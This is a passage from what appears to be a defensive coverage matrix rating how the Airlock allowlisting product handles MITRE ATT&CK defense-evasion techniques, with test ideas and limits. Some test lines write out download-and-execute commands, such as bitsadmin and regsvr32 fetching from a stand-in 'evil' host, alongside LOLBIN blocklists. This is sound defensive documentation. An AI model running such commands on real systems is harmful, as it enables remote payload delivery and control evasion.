**Yes** 🟢 | default-deny | Testable: yes

Polymorphic code generates unique hash each time -> never matches allowlist. Default-deny is inherently anti-polymorphic. This is a strong advantage over signature-based detection.

**Test:** Polymorphic exe -> unique hash every time -> blocked every time.

**Limitations:** Fundamental strength of allowlisting vs AV signatures.

### T1027.015 - Compression
**Yes** 🟢 | default-deny | Testable: partial

Compressed payload extracted and executed -> must be trusted.

**Test:** Extracted exe -> blocked.

### T1027.016 - Junk Code Insertion
**Yes** 🟢 | default-deny | Testable: partial

Junk code changes hash -> not in allowlist -> blocked.

**Test:** Modified binary -> blocked.

### T1027.017 - SVG Smuggling
**Yes** 🟢 | default-deny | Testable: yes

SVG smuggling. Similar to HTML smuggling. Assembled file must be trusted to execute.

**Test:** SVG smuggling assembles payload -> user executes -> blocked.

**Limitations:** Assembly in browser.

### T1036 - Masquerading
**Yes** 🟢 | default-deny | Testable: yes

Masquerading changes file appearance but not file hash. Airlock checks SHA-256 hash of actual file content - masquerading is irrelevant to enforcement.

**Test:** Renamed malware -> hash doesn't match allowlist -> blocked. Blocklist original_filename metarule catches renamed trusted tools.

### T1036.001 - Invalid Code Signature
**Yes** 🟢 | default-deny + publisher-trust | Testable: yes

Invalid code signature. File with invalid/spoofed signature. Airlock verifies publisher signatures cryptographically. Invalid sig = untrusted.

**Test:** Exe with invalid signature -> not trusted by publisher -> blocked unless hash-trusted.

**Limitations:** Airlock's publisher trust verifies signatures properly.

### T1036.002 - Right-to-Left Override
**Yes** 🟢 | default-deny | Testable: yes

Right-to-left override. Disguises file extension. Airlock hashes the actual file regardless of display name.

**Test:** RLO-renamed exe -> still hashed as exe -> blocked if untrusted.

**Limitations:** Hash check is name-agnostic.

### T1036.003 - Rename Legitimate Utilities
**Yes** 🟢 | blocklist-metarule (original_filename) | Testable: yes

Rename legitimate utilities. Renamed tool still has same hash. BUT blocklist metadata engine uses original_filename field which survives renaming. Can blocklist by original_filename regardless of actual filename.

**Test:** Rename powershell.exe to svchost.exe -> blocklist metarule on original_filename 'powershell' still catches it.

**Limitations:** Original filename is embedded in PE metadata. This is a strong detection.

### T1036.004 - Masquerade Task or Service
**No** ⚪ | none

Masquerade task or service name. Naming trick. Doesn't affect file trust.

**Test:** N/A - service/task naming is cosmetic.

**Limitations:** Service binary still checked regardless of service name.

### T1036.005 - Match Legitimate Resource Name or Location
**Yes** 🟢 | default-deny | Testable: yes

Match legitimate resource name/location. Malicious file in legitimate-looking path. Hash check catches regardless of location.

**Test:** Malware in C:\Windows\System32 (untrusted hash) -> blocked.

**Limitations:** If directory is path-trusted, could be a gap. Don't path-trust System32 broadly.

### T1036.007 - Double File Extension
**Yes** 🟢 | default-deny | Testable: yes

Double file extension. document.pdf.exe displayed as PDF. Airlock checks actual file type and hashes.

**Test:** Double extension exe -> hashed as PE -> blocked.

### T1036.008 - Masquerade File Type
**Yes** 🟢 | default-deny | Testable: yes

Masquerade file type. File with wrong extension. Airlock hashes the full file content.

**Test:** Exe with .txt extension -> when executed, still hashed as PE -> blocked if untrusted.

### T1036.010 - Masquerade Account Name
**No** ⚪ | none

Masquerade account name. Identity-level disguise.

### T1036.012 - Browser Fingerprint
**No** ⚪ | none

Browser fingerprint manipulation. Browser behavior, no file execution.

### T1055 - Process Injection
**No** ⚪ | DLL-control (conditional) | Testable: partial

Process injection (parent). Injecting code into trusted process memory. Airlock doesn't monitor memory operations. If injection requires loading a DLL from disk, DLL control catches it.

**Test:** DLL injection where DLL is a file on disk -> DLL must be trusted. Memory-only injection -> not caught.

**Limitations:** Primary gap. EDR territory for memory-based injection.

### T1055.001 - Dynamic-link Library Injection
**Yes** 🟢 | DLL-control | Testable: yes

DLL injection via LoadLibrary - DLL file must exist on disk and be trusted. Airlock blocks untrusted DLL at load time.

**Test:** CreateRemoteThread + LoadLibrary with untrusted DLL -> DLL blocked at load.

**Limitations:** Reflective DLL injection (loaded entirely from memory, no file on disk) not caught - that's EDR territory.

### T1055.002 - Portable Executable Injection
**No** ⚪ | none

PE injection. Writing PE directly into process memory. No file on disk.

**Test:** N/A - memory-only.

**Limitations:** EDR territory.

### T1055.003 - Thread Execution Hijacking
**No** ⚪ | none

Thread execution hijacking. Modifying existing thread in trusted process. Memory-level.

### T1055.004 - Asynchronous Procedure Call
**No** ⚪ | none

Asynchronous procedure call (APC) injection. Memory-level.

### T1055.005 - Thread Local Storage
**No** ⚪ | none

Thread local storage injection. Memory-level.

### T1055.011 - Extra Window Memory Injection
**No** ⚪ | none

Extra window memory injection. Memory-level.

### T1055.012 - Process Hollowing
**No** ⚪ | DLL-control (conditional) | Testable: partial

Process hollowing creates a suspended process with a trusted binary, then replaces its image in memory. The memory replacement is invisible to Airlock. The initial process uses a trusted binary so Airlock allows it.

**Test:** N/A - memory manipulation of trusted process.

**Limitations:** If hollowing stages payload as file on disk first, that file is checked. Pure memory hollowing not caught. EDR territory.

### T1055.013 - Process Doppelgänging
**No** ⚪ | default-deny (potentially) | Testable: partial

Process doppelganging uses NTFS transactions to create a file, load it into memory, then roll back the transaction. The file never persists on disk. Airlock's kernel driver may or may not intercept the transacted file load - needs lab validation.

**Test:** Needs lab testing to confirm whether Airlock's kernel driver intercepts file loads during NTFS transactions.

**Limitations:** Uncertain coverage. Treat as not covered until validated.

### T1055.015 - ListPlanting
**No** ⚪ | none

ListPlanting. Message-based code execution in trusted process. Memory-level.

### T1070 - Indicator Removal
**No** ⚪ | none

Indicator removal (parent). Deleting logs, files, etc. Data operations using trusted tools.

### T1070.001 - Clear Windows Event Logs
**Yes** 🟢 | blocklist-metarule | Testable: yes

wevtutil.exe: restrict via blocklist metarule for non-admins. Prevents attacker from clearing event logs to cover tracks.

**Test:** Metarule: original_filename 'wevtutil' AND user NOT admin -> blocks log clearing.

**Limitations:** Admin-exempted users can still clear logs. Also clearable via PS (Clear-EventLog) if PS is trusted.

### T1070.003 - Clear Command History
**No** ⚪ | none

Clear command history. Data operation in trusted process.

### T1070.004 - File Deletion
**No** ⚪ | none

File deletion. del/rm via trusted shell. Data operation.

### T1070.005 - Network Share Connection Removal
**No** ⚪ | none

Network share connection removal via net use /delete. net.exe cannot be practically blocklisted. Minor technique.

### T1070.006 - Timestomp
**No** ⚪ | none

Timestomp. Modifying file timestamps. Data operation.

**Limitations:** Airlock hashes file content, not timestamps.

### T1070.007 - Clear Network Connection History and Configurations
**No** ⚪ | none

Clear network connection history. Data operation.

### T1070.008 - Clear Mailbox Data
**No** ⚪ | none

Clear mailbox data. Data operation.

### T1070.009 - Clear Persistence
**No** ⚪ | none

Clear persistence. Removing previously set persistence. Data operation.

### T1070.010 - Relocate Malware
**No** ⚪ | default-deny | Testable: partial

Relocating malware to a different directory. File still has untrusted hash -> blocked regardless of location.

**Test:** Relocated malware still blocked by hash check.

**Limitations:** Actually covered by default-deny (hash doesn't change with location) but the technique itself is about evasion, and Airlock doesn't prevent file movement.

### T1078 - Valid Accounts
**No** ⚪ | none

Valid accounts. Using legitimate credentials. Identity plane. No file execution.

**Limitations:** Post-access, Airlock enforces on tools attacker runs with valid creds.

### T1078.001 - Default Accounts
**No** ⚪ | none

Default accounts. Identity.

### T1078.002 - Domain Accounts
**No** ⚪ | none

Domain accounts. Identity.

### T1078.003 - Local Accounts
**No** ⚪ | none

Local accounts. Identity.

### T1112 - Modify Registry
**Yes** 🟢 | blocklist-metarule | Testable: yes

reg.exe and regedit.exe: restrict via blocklist metarule for non-admins. Many persistence techniques rely on registry modification - blocking reg.exe reduces attack surface.

**Test:** Metarule: original_filename 'reg' AND user NOT admin -> blocks reg.exe. Metarule: original_filename 'regedit' AND user NOT admin -> blocks regedit.

**Limitations:** PowerShell Set-ItemProperty still available if PS trusted. Registry APIs from trusted processes not caught.

### T1127 - Trusted Developer Utilities Proxy Execution
**Yes** 🟢 | blocklist + default-deny + DLL-control | Testable: yes

Trusted developer utilities proxy execution (parent). Tools like MSBuild used to execute code. These LOLBINs can be blocklisted. Payloads they load must be trusted.

**Test:** Blocklist MSBuild, InstallUtil, etc. Payload DLLs loaded by these tools must be trusted.

**Limitations:** Core LOLBIN defense. Blocklist + DLL control is strong.

### T1127.001 - MSBuild
**Yes** 🟢 | blocklist + DLL-control + default-deny | Testable: yes

MSBuild. Can compile and execute code from XML project files. MSBuild.exe can be blocklisted. Output binaries/DLLs must be trusted.

**Test:** 1) Blocklist msbuild.exe for non-developers. 2) MSBuild output exe -> blocked (untrusted). 3) MSBuild loading untrusted DLL -> blocked.

**Limitations:** If MSBuild is allowlisted, it can compile code. Blocklist is key.

### T1127.002 - ClickOnce
**Yes** 🟢 | default-deny + DLL-control | Testable: partial

ClickOnce. Application deployment via .application files. Downloaded assemblies must be trusted.

**Test:** ClickOnce deploying untrusted assembly -> blocked.

**Limitations:** ClickOnce deployment mechanism itself uses trusted dfsvc.exe.

### T1127.003 - JamPlus
**Yes** 🟢 | default-deny | Testable: yes

JamPlus. Build tool. Can execute arbitrary code. Must be allowlisted to run.

**Test:** JamPlus not allowlisted -> blocked.

**Limitations:** Niche tool. Unlikely to be in enterprise allowlist.

### T1134 - Access Token Manipulation
**No** ⚪ | none

Access token manipulation. API-level operations inside trusted process. No file execution.

**Limitations:** If tool for token manipulation is untrusted, tool itself blocked.

### T1134.001 - Token Impersonation/Theft
**No** ⚪ | none

Token impersonation/theft. API-level.

### T1134.002 - Create Process with Token
**No** ⚪ | default-deny | Testable: partial

Process created with stolen token - the process binary must be trusted, but token manipulation itself is API-level and not caught.

**Limitations:** Token manipulation is identity/API level. EDR territory.

### T1134.003 - Make and Impersonate Token
**No** ⚪ | none

Make and impersonate token. API-level.

### T1134.004 - Parent PID Spoofing
**No** ⚪ | default-deny | Testable: partial

Parent PID spoofing is API-level process creation. Binary must be trusted but spoofing is not detected.

**Limitations:** May affect Airlock process trust rules that key on parent process. Test.

### T1134.005 - SID-History Injection
**No** ⚪ | none

SID-History injection. Identity/AD manipulation.

### T1140 - Deobfuscate/Decode Files or Information
**Yes** 🟢 | default-deny + blocklist | Testable: yes

Decoded/deobfuscated payload must be trusted to execute. certutil.exe (commonly used for decoding) can be blocklisted.

**Test:** 1) certutil -decode output.exe -> output.exe blocked. 2) Blocklist certutil for non-admins.

**Limitations:** Decoding itself not prevented if tool is trusted. Decoded file execution IS blocked.

### T1197 - BITS Jobs
**Yes** 🟢 | default-deny + blocklist | Testable: yes

BITS downloads files to disk. Downloaded file must be trusted to execute. bitsadmin.exe can be blocklisted to prevent BITS job creation.

**Test:** bitsadmin /transfer job /download http://evil/payload.exe C:\Temp\p.exe -> downloads OK, execution blocked. Blocklist bitsadmin for non-admins.

**Limitations:** Download itself not prevented - only execution of downloaded payload.

### T1202 - Indirect Command Execution
**Yes** 🟢 | default-deny + blocklist | Testable: yes

Indirect command execution via trusted LOLBINs (pcalua.exe, forfiles.exe, etc). Launched payload must be trusted. The indirect launchers can be blocklisted.

**Test:** 1) forfiles /c C:\Temp\malware.exe -> malware blocked. 2) Blocklist pcalua.exe, forfiles.exe, SyncAppvPublishingServer.exe.

**Limitations:** Indirect launcher is trusted but payload is still checked at execution.

### T1205 - Traffic Signaling
**No** ⚪ | none

Traffic signaling / port knocking. Network-level. No file execution.

**Limitations:** Network security.

### T1205.001 - Port Knocking
**No** ⚪ | none

Port knocking. Network-level.

### T1205.002 - Socket Filters
**No** ⚪ | none

Socket filters. Kernel-level network manipulation.

### T1207 - Rogue Domain Controller
**No** ⚪ | none

Rogue domain controller. AD-level attack. Not file execution.

**Limitations:** AD security.

### T1211 - Exploitation for Defense Evasion
**No** ⚪ | default-deny | Testable: partial

Exploitation for defense evasion is about abusing a vulnerability to bypass security controls. The exploit itself runs inside a trusted process. Airlock doesn't detect or prevent exploits.

**Limitations:** Exploit prevention, patching, and EDR behavioral detection are the controls.

### T1216 - System Script Proxy Execution
**Yes** 🟢 | blocklist + script-control | Testable: yes

System script proxy execution (parent). Signed scripts used to execute code. Scripts can be blocklisted.

**Test:** Blocklist known proxy scripts. Payload loaded by proxy must be trusted.

### T1216.001 - PubPrn
**Yes** 🟢 | blocklist + script-control | Testable: yes

PubPrn.vbs. Signed VBScript for proxy execution. Can be blocklisted or covered by script control.

**Test:** Blocklist PubPrn.vbs or block via script control if modified (hash change).

**Limitations:** Original signed PubPrn.vbs may be trusted by publisher.

### T1216.002 - SyncAppvPublishingServer
**Yes** 🟢 | script-control + blocklist | Testable: yes

SyncAppvPublishingServer. Can execute PowerShell. The PS code must pass script control.

**Test:** Blocklist SyncAppvPublishingServer.exe. PS script it invokes checked by script control.

### T1218 - System Binary Proxy Execution
**Yes** 🟢 | blocklist (predefined) + DLL-control + script-control | Testable: yes

System binary proxy execution (parent). LOLBINs used to execute code bypassing application controls. Airlock has predefined blocklist packages for these. DLL/script payloads must be trusted. This is a key defense area for Airlock.

**Test:** Import LOLBAS/Microsoft Recommended Block Rules predefined blocklist. Payloads loaded by LOLBINs must be trusted regardless.

**Limitations:** Comprehensive LOLBIN defense with blocklist + payload control.

### T1218.001 - Compiled HTML File
**Yes** 🟢 | default-deny + blocklist | Testable: yes

Compiled HTML (.chm). hh.exe opens CHM files. Content inside CHM can launch processes. Launched process must be trusted. hh.exe can be blocklisted.

**Test:** 1) CHM launching untrusted exe -> blocked. 2) Blocklist hh.exe.

**Limitations:** CHM HTML content inside hh.exe context may execute some scripts.

### T1218.002 - Control Panel
**Yes** 🟢 | DLL-control | Testable: yes

Control panel items (.cpl). CPL files are DLLs. Must be trusted.

**Test:** Malicious .cpl (DLL) -> blocked at load.

### T1218.003 - CMSTP
**Yes** 🟢 | blocklist + DLL-control | Testable: yes

CMSTP. Can install/execute COM scriptlets. cmstp.exe can be blocklisted. Loaded DLLs must be trusted.

**Test:** 1) Blocklist cmstp.exe. 2) CMSTP loading untrusted DLL -> blocked.

### T1218.004 - InstallUtil
**Yes** 🟢 | blocklist + DLL-control | Testable: yes

InstallUtil. .NET utility executing assemblies. Can be blocklisted. Loaded assemblies (DLLs) must be trusted.

**Test:** 1) Blocklist installutil.exe. 2) InstallUtil loading untrusted assembly -> blocked.

### T1218.005 - Mshta
**Yes** 🟢 | blocklist + script-control | Testable: yes

Mshta. HTML application host. Can execute VBScript/JScript. Covered by script control. Can be blocklisted. Predefined in blocklist packages.

**Test:** 1) Blocklist mshta.exe. 2) HTA file -> script control blocks untrusted content.

**Limitations:** Key LOLBIN. Blocklist strongly recommended.

### T1218.007 - Msiexec
**Yes** 🟢 | script-control + DLL-control | Testable: yes

MSI files are covered by script control - untrusted MSI files blocked at execution. DLLs loaded by MSI must be trusted via DLL control. Note: msiexec.exe itself cannot be practically blocklisted as it is used by Windows for all MSI-based installations. Script control on the MSI file is the primary defense.

**Test:** 1) Untrusted .msi file -> blocked by script control. 2) MSI loading untrusted DLL during install -> DLL blocked.

**Limitations:** msiexec.exe cannot be blocklisted. Trusted-signed MSIs from trusted publishers install normally.

### T1218.008 - Odbcconf
**Yes** 🟢 | blocklist + DLL-control | Testable: yes

Odbcconf. Can execute DLLs. Can be blocklisted. DLL must be trusted.

**Test:** 1) Blocklist odbcconf.exe. 2) Odbcconf loading untrusted DLL -> blocked.

### T1218.009 - Regsvcs/Regasm
**Yes** 🟢 | blocklist + DLL-control | Testable: yes

Regsvcs/Regasm. .NET registration utilities. Execute assemblies. Can be blocklisted. Assemblies must be trusted.

**Test:** 1) Blocklist regsvcs/regasm. 2) Loaded assembly must be trusted.

### T1218.010 - Regsvr32
**Yes** 🟢 | DLL-control | Testable: yes

Regsvr32 proxy execution technique. Any DLL that regsvr32 attempts to load must be trusted via DLL control. Untrusted DLLs blocked at load time regardless of how regsvr32 is invoked. Note: blanket blocklisting regsvr32.exe is impractical as it is used by Windows for legitimate COM registration. DLL control is the primary defense.

**Test:** 1) regsvr32 untrusted.dll -> DLL blocked at load. 2) regsvr32 /s /n /u /i:http://evil/script scrobj.dll -> if scrobj.dll payload writes untrusted DLL, blocked. DLL control catches the payload regardless.

**Limitations:** regsvr32 itself cannot be practically blocklisted without breaking Windows. The defense is DLL control on what regsvr32 loads, not blocking regsvr32.

### T1218.011 - Rundll32
**Yes** 🟢 | DLL-control | Testable: yes

Rundll32 executes DLL exports. Any DLL passed to rundll32 must be trusted via DLL control. Untrusted DLLs blocked at load time. Note: blanket blocklisting rundll32.exe is impractical as it is used by Windows for Control Panel, shell extensions, and system operations. Restricting rundll32 for non-admins via metarule is possible but aggressive - evaluate operational impact. DLL control is the primary defense.

**Test:** rundll32 C:\Temp\untrusted.dll,EntryPoint -> DLL blocked at load. DLL control catches the payload regardless of how rundll32 is invoked.

**Limitations:** rundll32 with trusted DLLs runs normally. Blocklisting rundll32 for non-admins is possible via metarule but may break legitimate functionality. Test thoroughly in audit mode.

### T1218.012 - Verclsid
**Yes** 🟢 | DLL-control | Testable: yes

Verclsid. COM CLSID verification. Loads DLLs. DLL must be trusted.

**Test:** Verclsid loading untrusted DLL -> blocked.

**Limitations:** Niche LOLBIN.

### T1218.013 - Mavinject
**Yes** 🟢 | blocklist + DLL-control | Testable: yes

Mavinject. DLL injection utility. Can be blocklisted. DLL must be trusted.

**Test:** 1) Blocklist mavinject.exe. 2) Mavinject loading untrusted DLL -> blocked.

### T1218.014 - MMC
**Yes** 🟢 | DLL-control | Testable: yes

MMC. Snap-in execution via .msc files. Snap-in DLLs must be trusted.

**Test:** MMC loading untrusted snap-in DLL -> blocked.

**Limitations:** MMC itself is trusted. Snap-in DLLs are the control point.

### T1218.015 - Electron Applications
**Yes** 🟢 | default-deny | Testable: yes

Untrusted Electron app exe blocked by default-deny. If Electron app is trusted, its bundled JS runtime executes in-process.

**Test:** Untrusted Electron app exe -> blocked.

**Limitations:** Trusted Electron apps run their bundled code in-process - not separately controlled.

### T1220 - XSL Script Processing
**Yes** 🟢 | blocklist + script-control | Testable: yes

XSL script processing. msxsl.exe can be blocklisted. wmic with /format:xsl - payload scripts checked by script control.

**Test:** 1) Blocklist msxsl.exe. 2) XSL script payload checked via script control.

**Limitations:** wmic.exe with /format:xsl harder to control without blocklisting wmic itself.

### T1221 - Template Injection
**Yes** 🟢 | default-deny + DLL-control | Testable: partial

Template injection in Office docs. Remote template loads in trusted Office. Macro code runs inside Office. Dropped payloads blocked.

**Test:** Remote template macro drops exe -> exe blocked.

**Limitations:** Macro code runs inside trusted Office process.

### T1222 - File and Directory Permissions Modification
**Yes** 🟢 | blocklist-metarule | Testable: yes

Permission modification tools (icacls, takeown) restrictable via blocklist metarule.

**Test:** Blocklist icacls.exe and takeown.exe for non-admins.

**Limitations:** PowerShell alternatives still available if PS trusted.

### T1222.001 - Windows File and Directory Permissions Modification
**Yes** 🟢 | blocklist-metarule | Testable: yes

icacls.exe and takeown.exe: restrict via blocklist metarule for non-admins.

**Test:** Blocklist icacls.exe and takeown.exe for non-admins.

**Limitations:** PowerShell Set-Acl available if PS trusted.

### T1480 - Execution Guardrails
**No** ⚪ | default-deny (indirect) | Testable: yes

Execution guardrails. If malware is untrusted, blocked before guardrails checked.

**Limitations:** Malware can't execute to check guardrails.

### T1480.001 - Environmental Keying
**No** ⚪ | default-deny (indirect) | Testable: yes

Environmental keying. Same as parent.

**Test:** Same as T1480.

### T1480.002 - Mutual Exclusion
**No** ⚪ | default-deny (indirect) | Testable: yes

Mutual exclusion. Same as parent.

**Test:** Same as T1480.

### T1484 - Domain or Tenant Policy Modification
**No** ⚪ | none

Domain/tenant policy modification. AD/cloud policy changes. No file execution.

**Limitations:** AD security.

### T1484.001 - Group Policy Modification
**No** ⚪ | none

Group policy modification. AD operation.

**Limitations:** If modified GPO delivers untrusted software, execution blocked on endpoints.

### T1484.002 - Trust Modification
**No** ⚪ | none

Trust modification. AD trust changes.

### T1497 - Virtualization/Sandbox Evasion
**No** ⚪ | default-deny (indirect) | Testable: yes

VM/sandbox evasion checks. If malware is untrusted, blocked before it can check.

### T1497.001 - System Checks
**No** ⚪ | default-deny (indirect) | Testable: yes

System checks. Same.

**Test:** Same.

### T1497.002 - User Activity Based Checks
**No** ⚪ | default-deny (indirect) | Testable: yes

User activity checks. Same.

**Test:** Same.

### T1497.003 - Time Based Checks
**No** ⚪ | default-deny (indirect) | Testable: yes

Time based checks. Same.

**Test:** Same.

### T1542 - Pre-OS Boot
**No** ⚪ | none

Pre-OS boot. Firmware/bootkit operates below OS. Airlock kernel driver loads after OS boot.

**Test:** N/A - below OS level.

**Limitations:** Secure Boot is the control here.

### T1542.001 - System Firmware
**No** ⚪ | none

System firmware. Below OS.

**Limitations:** UEFI security.

### T1542.002 - Component Firmware
**No** ⚪ | none

Component firmware. Below OS.

**Limitations:** Hardware security.

### T1542.003 - Bootkit
**No** ⚪ | none

Bootkit. Below OS level.

**Limitations:** Secure Boot/ELAM territory.

### T1548 - Abuse Elevation Control Mechanism
**Yes** 🟢 | default-deny | Testable: partial

UAC bypass techniques often involve DLL hijacking in auto-elevate apps or registry modification pointing to untrusted payload. DLL control blocks hijacked DLLs. Untrusted payloads from registry-based bypasses blocked.

**Test:** 1) UAC bypass via DLL hijack in auto-elevate app -> DLL blocked. 2) fodhelper.exe reg key to unsigned exe -> exe blocked.

**Limitations:** Registry-based bypasses where payload is a trusted binary (cmd.exe) succeed - use blocklist to restrict.

### T1548.002 - Bypass User Account Control
**Yes** 🟢 | DLL-control + default-deny | Testable: yes

UAC bypass. Various methods: DLL hijacking in auto-elevate apps (DLL must be trusted), mock trusted dirs, fodhelper.exe registry abuse. DLL hijack UAC bypasses caught by DLL control. Registry-based UAC bypasses using trusted auto-elevate binaries: the trusted binary runs, but any untrusted payload it loads is blocked.

**Test:** 1) UAC bypass via DLL hijack in auto-elevate app -> DLL blocked. 2) fodhelper.exe reg key to unsigned exe -> exe blocked. 3) Blocklist common UAC bypass tools.

**Limitations:** Registry-based bypasses where payload is trusted binary (e.g., cmd.exe) succeed. Use blocklist to restrict.

### T1550 - Use Alternate Authentication Material
**No** ⚪ | none

Use alternate auth material (parent). Credential reuse. Identity plane.

**Limitations:** Post-auth, tools attacker runs are checked.

### T1550.002 - Pass the Hash
**No** ⚪ | none

Pass the hash. Credential technique. No new file execution required if using trusted tools.

**Limitations:** If PtH tool (mimikatz) is untrusted, tool itself blocked.

### T1550.003 - Pass the Ticket
**No** ⚪ | none

Pass the ticket. Same as PtH.

### T1553 - Subvert Trust Controls
**No** ⚪ | default-deny + publisher-trust | Testable: partial

Subvert trust controls. Techniques targeting trust verification mechanisms. Airlock performs its own trust verification independent of Windows, but this is about undermining trust models broadly.

**Limitations:** Publisher trust compromise (attacker gets valid code signing cert) is the fundamental risk. See T1553.002.

### T1553.002 - Code Signing
**No** ⚪ | publisher-trust | Testable: partial

Code signing. Attacker signs malware with legitimate cert. If that cert's publisher is trusted in Airlock, malware passes. This is a fundamental trust model risk for publisher-based trust.

**Test:** Malware signed by trusted publisher -> allowed. Unsigned -> blocked.

**Limitations:** Publisher trust trade-off. Hash trust is more granular but harder to manage.

### T1553.003 - SIP and Trust Provider Hijacking
**No** ⚪ | publisher-trust (independent) | Testable: partial

SIP/Trust Provider hijacking modifies Windows signature verification. Airlock's own publisher verification may use independent path, but this needs lab validation.

**Test:** Needs lab testing to confirm Airlock's signature verification independence from SIP providers.

**Limitations:** Uncertain. Treat as not covered until validated.

### T1553.004 - Install Root Certificate
**No** ⚪ | publisher-trust

Install root certificate. Adding trusted CA. Airlock publisher trust verifies code signing certificates, not web/TLS certs. Custom code signing certs trusted by Airlock are explicitly added by admin.

**Test:** N/A - Airlock admin must explicitly trust publishers.

**Limitations:** Airlock doesn't auto-trust based on system cert store for execution decisions.

### T1553.005 - Mark-of-the-Web Bypass
**No** ⚪ | default-deny | Testable: yes

Mark-of-the-Web bypass. MOTW is a Windows security feature. Airlock doesn't rely on MOTW for trust decisions - it hashes files regardless.

**Test:** File with or without MOTW -> Airlock hashes and checks regardless.

**Limitations:** MOTW bypass is irrelevant to Airlock's enforcement model.

### T1553.006 - Code Signing Policy Modification
**No** ⚪ | default-deny (independent) | Testable: partial

Code signing policy modification. Modifying Windows code signing enforcement. Airlock's enforcement is independent of Windows code signing policy.

**Test:** Airlock enforces regardless of Windows code signing policy state.

**Limitations:** Airlock operates its own trust model.

### T1556 - Modify Authentication Process
**No** ⚪ | none (sub-technique dependent)

Modify authentication process. Modifies login/auth mechanisms. Some sub-techniques involve DLL loading.

**Test:** See sub-techniques.

### T1556.001 - Domain Controller Authentication
**Yes** 🟢 | DLL-control | Testable: yes

Domain controller auth DLL. Password filter loaded by lsass. Must be trusted.

**Test:** Untrusted password filter DLL on DC -> blocked.

**Limitations:** DC/server focused.

### T1556.002 - Password Filter DLL
**Yes** 🟢 | DLL-control | Testable: yes

Password filter DLL. Loaded by lsass on password change. Must be trusted.

**Test:** Untrusted password filter DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1556.005 - Reversible Encryption
**No** ⚪ | none

Reversible encryption. AD policy change. No file execution.

**Limitations:** AD security.

### T1556.006 - Multi-Factor Authentication
**No** ⚪ | none

MFA interception. Identity plane.

**Limitations:** MFA security.

### T1556.007 - Hybrid Identity
**No** ⚪ | none

Hybrid identity. Cloud/identity plane.

### T1556.008 - Network Provider DLL
**Yes** 🟢 | DLL-control | Testable: yes

Network provider DLL. Loaded at logon. Must be trusted.

**Test:** Untrusted network provider DLL -> blocked.

**Limitations:** Reg mod not prevented.

### T1562 - Impair Defenses
**Yes** 🟢 | agent-tamper-protection | Testable: yes

Airlock agent has kernel-driver-based tamper protection. User-mode attempts to stop/modify the agent are prevented.

**Test:** Attempt to kill/stop Airlock service -> kernel driver prevents. Untrusted tools used to disable other security software -> tools blocked.

**Limitations:** Kernel-level attacks may bypass protection. Agent tamper protection is for user-mode tampering.

### T1562.001 - Disable or Modify Tools
**Yes** 🟢 | agent-tamper-protection + default-deny | Testable: yes

Disable or modify tools. Airlock agent protected by kernel driver. Attacker cannot stop/modify agent from user mode. Tools used to disable other security tools must be trusted.

**Test:** 1) Attempt to kill Airlock service -> protected by kernel driver. 2) Untrusted tool to disable Defender -> tool blocked.

**Limitations:** If attacker has kernel access, protection may be bypassed.

### T1562.002 - Disable Windows Event Logging
**Yes** 🟢 | blocklist-metarule | Testable: yes

wevtutil.exe and auditpol.exe: restrict via blocklist metarule for non-admins.

**Test:** Metarule: blocklist wevtutil.exe AND auditpol.exe for non-admins.

**Limitations:** PowerShell and registry-based log disabling still possible if those tools are trusted.

### T1562.003 - Impair Command History Logging
**No** ⚪ | none

Impair command history logging. PS/shell config. Data operation.

### T1562.004 - Disable or Modify System Firewall
**Yes** 🟢 | blocklist-metarule | Testable: yes

netsh.exe: restrict via blocklist metarule for non-admins. Prevents firewall rule manipulation.

**Test:** Metarule: original_filename 'netsh' AND user NOT admin -> blocks netsh advfirewall.

**Limitations:** PowerShell Set-NetFirewallProfile available if PS trusted.

### T1562.006 - Indicator Blocking
**No** ⚪ | none

Indicator blocking. Preventing security tool data collection. Behavioral.

### T1562.009 - Safe Mode Boot
**No** ⚪ | none (conditional) | Testable: partial

Safe mode boot may prevent Airlock kernel driver from loading depending on driver start type. Agent behavior in safe mode needs validation.

**Test:** Test Airlock agent behavior in safe mode - does the kernel driver load?

**Limitations:** Safe mode is an operational concern. If driver doesn't load in safe mode, no enforcement.

### T1562.010 - Downgrade Attack
**No** ⚪ | none

Downgrade attack. Forcing older versions of protocols/tools. No file execution.

### T1562.011 - Spoof Security Alerting
**No** ⚪ | none

Spoof security alerting. Manipulating alert/log content. Behavioral.

### T1564 - Hide Artifacts
**No** ⚪ | none

Hide artifacts (parent). Hiding files/processes/users. Cosmetic. Doesn't affect file trust.

**Limitations:** Hidden files still hashed and checked if executed.

### T1564.001 - Hidden Files and Directories
**Yes** 🟢 | default-deny | Testable: yes

Hidden files still hashed and checked when executed. Hidden attribute doesn't affect Airlock enforcement.

**Test:** attrib +h malware.exe -> execute -> blocked.

### T1564.002 - Hidden Users
**No** ⚪ | none

Hidden users. Identity operation.

### T1564.003 - Hidden Window
**No** ⚪ | default-deny | Testable: partial

Process with hidden window. Binary must be trusted but window visibility is cosmetic.

**Limitations:** Window visibility doesn't affect enforcement.

### T1564.004 - NTFS File Attributes
**No** ⚪ | default-deny (conditional) | Testable: partial

NTFS alternate data streams. Exe stored in ADS may or may not be intercepted by Airlock kernel driver at execution time. Needs lab validation.

**Test:** Test: store exe in ADS, execute via wmic/rundll32 -> validate Airlock intercepts.

**Limitations:** Uncertain coverage. Treat as not covered until validated.

### T1564.005 - Hidden File System
**No** ⚪ | default-deny | Testable: partial

Hidden file system. Execution from hidden FS should be intercepted by kernel driver but needs validation.

**Limitations:** Needs validation.

### T1564.006 - Run Virtual Instance
**Yes** 🟢 | default-deny | Testable: yes

VM software (QEMU, VirtualBox) must be allowlisted. If not trusted, blocked entirely.

**Test:** QEMU.exe not allowlisted -> blocked. VirtualBox not allowlisted -> blocked.

**Limitations:** If VM software is legitimately trusted, anything inside the VM is uncontrolled by host Airlock agent.

### T1564.007 - VBA Stomping
**No** ⚪ | none

VBA stomping. Modifying VBA macro code in Office docs. Macro runs inside trusted Office.

**Limitations:** Dropped payloads blocked.

### T1564.008 - Email Hiding Rules
**No** ⚪ | none

Email hiding rules. Outlook rules. Data operation.

### T1564.010 - Process Argument Spoofing
**No** ⚪ | none

Process argument spoofing. Modifying command line after process creation. In-process behavior.

### T1564.011 - Ignore Process Interrupts
**No** ⚪ | none

Ignore process interrupts. Signal handling. In-process.

### T1564.012 - File/Path Exclusions
**No** ⚪ | none

File/path exclusions. Adding exclusions to security tools. Config operation.

**Limitations:** Airlock doesn't have user-configurable exclusions that could be abused this way.

### T1574 - Hijack Execution Flow
**Yes** 🟢 | DLL-control + default-deny | Testable: yes

